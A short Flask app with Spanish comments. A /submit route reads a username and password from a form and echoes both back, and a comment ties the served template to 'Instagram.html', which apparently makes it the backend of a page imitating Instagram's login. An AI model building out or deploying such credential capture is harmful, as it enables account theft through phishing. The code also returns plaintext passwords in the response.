from flask import Flask, request, render_template  # Asegúrate de importar render_template
import os

app = Flask(__name__)

@app.route('/')
def index():
    try:
        return render_template('index.html')  # Asegúrate de que Instagram.html esté en la carpeta templates
    except Exception as e:
        return str(e), 500

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    # print(f"Nombre: {username}, Contraseña: {password}")
    return f"Datos recibidos: {username}, Contraseña: {password}"

#if __name__ == '__main__':
 #   app.run(port=10001)
